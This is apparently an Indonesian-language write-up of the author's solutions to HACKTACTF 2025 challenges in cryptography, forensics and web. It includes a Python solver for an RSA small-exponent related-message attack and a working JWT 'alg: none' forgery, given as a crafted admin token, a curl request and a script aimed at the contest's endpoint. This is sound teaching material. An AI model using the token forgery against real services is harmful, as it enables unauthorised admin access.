---
title: HACKTACTF 2025

---

# HACKTACTF 2025

Disini saya ikut event ctf yang diselenggarakan oleh komunitas hackta x ruang guru dan mendapatkan peringkat 3 di final🥉

# Cryptography
## Caesar’s Overconfidence

![1](image/image1.png)

### Overview
Diberikan sebuah file .txt bernama message.txt yang berisi 
![image](image/image2.png)

### Analyze
Setelah saya liat liat sepertinya ini rot13 tapi ternyata bukan jadi saya coba metode lain dan ternyata metode enkripsinya adalah rot23

### Solution
Disini saya menggunakan tools online yaitu https://rot13.com/
![2](image/image3.png)

**FLAG: HACKTA{caesar_is_still_weak}**

## Polite Alphabet
![3](image/image4.png)

### Overview
Diberikan sebuah 2 file yang bernama ciphert.txt dan guest.txt, dari deskripsi dijelaskan bahwa metode encrypt adalah menggunakan Vigenère Cipher, tugas kita adalah mendecrypt pesan yang di encrypt tersebut menggunakan Vigenère Cipher, dan juga kita diberikan guest.txt yang berisi nama "tamu"

### Solution
Disini saya menggunakan tools online yaitu https://gchq.github.io/CyberChef/ untuk men decrypt pesannya.

isi ciphertext nya adalah:
![image](image/image5.png)

sedangkan isi guest.txt adalah nama orang orang dari alphabet A-Z

langsung saja kita coba masukkan key "HACKTA" karena format flagnya kan itu
![4](image/image6.png)


nah disini keliatan bahwa key yang benar itu adalah "DAVID" jadi langsung saja kita jadikan "DAVID" sebagai key nya
![5](image/image7.png)

**FLAG: HACKTA{chipertextabsolute}**

## Oracle
![6](image/image8.png)

### Overview
Diberikan sebuah file zip bernama oracle.zip, dan ternyata setelah saya unzip di dalam file oracle nya itu sudah ada solvernya jadi kita tinggal run solvernya (mungkin ini chall bonus?)

### Solution
Run solver dengan perintah:
```bash
python3 solverOracle.py
```
Result:
![7](image/image9.png)

**FLAG: HACKTA{lfsr_berlekamp_massey_is_powerful_1337}**

## Nameless
![8](image/image10.png)

### Overview

Diberikan file nameless.zip dan setelah di unzip berisi file sebagai berikut:

```
┌──(venv)─(nibels㉿DESKTOP-B150451)-[~/…/final/crypto/nameless/nameless]
└─$ tree .
.
├── encrypt.py
├── FLAG
├── output.txt
└── Readme.md
```

encrypt.py
```python
def generate_challenge():
    p = getPrime(1024)
    q = getPrime(1024)
    N = p * q
    e = 3 # Eksponen kecil adalah kunci kerentanan ini

    # Pesan dasar
    base_msg = b"Pesan rahasia diplomatik hari ini adalah: "
    flag = b"HACKTA{?????????}"

    # Dua pesan yang sangat mirip (hanya beda padding kecil di tengah/akhir)
    m1 = bytes_to_long(base_msg + flag + b"\x00\x01")
    m2 = bytes_to_long(base_msg + flag + b"\x00\x02")

    c1 = pow(m1, e, N)
    c2 = pow(m2, e, N)
```

output.txt

```txt
N = 16368860169787881694673649293084098206354948801666639273260677777702667884977521340528492193227492585488294279012694824351511402212733214790818313613614412487231335984305697608280206293489373363433844110325429799418879434912131864848112888959057826019339246572933063834340021093681282768382174970948132268388202865186176104606530519727603146129020706812685172874153513754056062607597702407739775469634269575720017566616578503957406286615879286367161562139756351824679184455055765441200866840875134396239476331877770261074920331610211323373365221237664107352041090725061997881455125660124418497883606687710834630752733
e = 3
c1 = 12544655383815892806941352088692334844238168636128238314313988059634522283097163692458165109370008350925147186637948691905033630797742774869043431928330084689619153002608156478399218071824203635836019421345290965259530998735434932746891772641885798673380808486927634094407153102370727597262018702778815395280723765715274596536855824767210472807653268074963891540423434924281012541422584041736696690775850798846040101204914700322537192036055047878984413708968083602052873388223190689879983362287275755807416302883474606096245282190756015839945777440557700944192732649527503099401709549551540345108224823594043645645971
c2 = 12544655383815892806941352088692334844238168636128238314313988059634522283097163692458165109370008350925147186637948691905033630797742774869043431928330084689619153002608156478399218071824340985368477580005978497302932760058533356869912498535426923870915177106990237842832498366957549720238103517912155604696166430508383806828120263948710324900803688180344954185696792976979326223404525665525186882466462571981279027460922724109710702989395035270103416667129452113632568827025519850961812892405062062211644447485827845669658297116237434390720658861261537681259003009302941048817451242807489792154813423641609111950490
```




Diberikan dua ciphertext (`c1` dan `c2`) hasil enkripsi RSA dengan **public key yang sama** dan **eksponen kecil `e = 3`**. Dari deskripsi dan source code, kedua plaintext **hampir identik**, hanya berbeda sedikit di bagian akhir.

### Analyze

Di `encrypt.py` terlihat bahwa:

* `m1 = base_msg + flag + 0x0001`
* `m2 = base_msg + flag + 0x0002`

Artinya:

* `c1 = m³ mod N`
* `c2 = (m+1)³ mod N`

Karena `e = 3` dan kedua pesan saling berhubungan (related message), ini rentan terhadap **Related Message Attack pada RSA small exponent**.
Dengan mengekspansi persamaan kubik, kita bisa menurunkan rumus langsung untuk mencari `m` tanpa faktorisasi `N`.

### Solution

Gunakan relasi:

```
m = (2*c1 + c2 - 1) * inverse(c2 - c1 + 2, N) mod N
```

Setelah `m` didapat, tinggal dikonversi ke bytes untuk mendapatkan flag.

solver.py

```python
try:
    from Crypto.Util.number import long_to_bytes
except ImportError:
    def long_to_bytes(val):
        return val.to_bytes((val.bit_length() + 7) // 8, 'big')

def solve():
    try:
        data = {}
        with open('output.txt', 'r') as f:
            for line in f:
                if '=' in line:
                    key, val = line.split('=')
                    data[key.strip()] = int(val.strip())

        N = data['N']
        c1 = data['c1']
        c2 = data['c2']

        # Formula derived from:
        # m^3 = c1 mod N
        # (m+1)^3 = c2 mod N
        # Result: m = (2*c1 + c2 - 1) * inverse(c2 - c1 + 2, N) % N

        numerator = (2 * c1 + c2 - 1) % N
        denominator = (c2 - c1 + 2) % N

        print(f"Calculating m = ({numerator} / {denominator}) % N")

        try:
            den_inv = pow(denominator, -1, N)
            m = (numerator * den_inv) % N
            print(f"Recovered m: {m}")

            flag_bytes = long_to_bytes(m)
            print(f"Flag bytes: {flag_bytes}")
            try:
                print(f"Flag decoded: {flag_bytes.decode()}")
            except:
                print("Could not decode bytes as utf-8")

        except ValueError:
            print("Inverse does not exist for denominator!")

    except FileNotFoundError:
        print("output.txt not found. Make sure you are running this in the correct directory.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    solve()
```

Result:
![9](image/image11.png)

**FLAG: HACKTA{c0pp3rsm1th_sh0rt_p4d_4tt4ck_1s_nasty}**

# Forensics

## The Hidden Backup 🩸
![10](image/image12.png)

### Overview

Diberikan sebuah file challenge.jpg dan juga cover.jpg saat saat saya buka foto challenge.jpg dan cover.jpg itu ndak bisa
![11](image/image13.png)
![12](image/image14.png)

### Solution
Kemarin pas saya mengerjakan itu saya cat challenge.jpg dan ternyata flagnya muncul wkwk
![13](image/image15.png)

**FLAG: HACKTA{f1l3_c4rv1ng_1s_34sy_r1ght?}**

# Web

## Sessionless (Upsolve)
![14](image/image16.png)

### Overview

Saat mengakses `session.hackta.id`, aplikasi web hanya menampilkan halaman sederhana tanpa fitur login.
![16](image/image17.png)

Endpoint yang menarik adalah:

```
GET /api/admin
```

Endpoint ini memerlukan **JWT token** pada header `Authorization`.

Percobaan tanpa token atau dengan token biasa akan menghasilkan error:

```json
{"error":"Forbidden"}
```

Namun, di halaman utama terdapat kalimat penting:

> **“We strictly follow the algorithm specified in the token header.”**

Kalimat ini menjadi **hint utama** dari challenge.

---

### Recon & Behavior

Beberapa hasil pengamatan:

* Server menggunakan **Express.js**
* Autentikasi berbasis **JWT**
* Token dikirim melalui:

  ```
  Authorization: Bearer <JWT>
  ```
* Tidak ada mekanisme login
* Tidak ada cookie session
* Tidak ada database token

Artinya, server **sepenuhnya mempercayai JWT yang dikirim client**.

---

### Analyze

Dalam implementasi JWT yang aman, server seharusnya:

* **Memaksa algoritma tertentu** (misalnya `HS256`)
* **Mengabaikan nilai `alg` dari header JWT**

Namun, dari deskripsi dan behavior server, dapat disimpulkan bahwa:

> Server **mempercayai algoritma yang tertulis di header JWT**

Ini membuka kerentanan klasik:

### JWT `alg: none` Vulnerability

Jika server mengikuti algoritma dari header, maka kita bisa membuat JWT dengan:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Pada algoritma `none`:

* Tidak ada signature
* Tidak ada secret
* Payload langsung dipercaya

Jika payload berisi role admin, server akan menganggap user sebagai admin.

---

### Exploit Strategy

1. Buat JWT dengan header:

   ```json
   {
     "alg": "none",
     "typ": "JWT"
   }
   ```

2. Payload minimal:

   ```json
   {
     "role": "admin"
   }
   ```

3. Encode header dan payload menggunakan Base64URL

4. Gabungkan tanpa signature:

   ```
   base64(header).base64(payload).
   ```

---

### Crafted JWT

JWT hasil encoding:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
```

---

### Manual Exploit (curl)

```bash
curl -i \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ." \
  https://session.hackta.id/api/admin
```

Response:

![17](image/image18.png)


### Solver (Python)

Berikut **solver Python otomatis** untuk challenge ini.

solve.py

```python
import base64
import json
import requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def generate_jwt():
    header = {
        "alg": "none",
        "typ": "JWT"
    }

    payload = {
        "role": "admin"
    }

    header_b64 = b64url(json.dumps(header).encode())
    payload_b64 = b64url(json.dumps(payload).encode())

    # alg none → signature kosong
    token = f"{header_b64}.{payload_b64}."
    return token

def solve():
    url = "https://session.hackta.id/api/admin"
    token = generate_jwt()

    headers = {
        "Authorization": f"Bearer {token}"
    }

    print("[+] Using JWT:")
    print(token)
    print("\n[+] Sending request...\n")

    r = requests.get(url, headers=headers)

    print(f"Status Code: {r.status_code}")
    print("Response:")
    print(r.text)

if __name__ == "__main__":
    solve()
```
Result:
![15](image/image19.png)

**FLAG: HACKTA{alg_none_is_a_trap}**

















































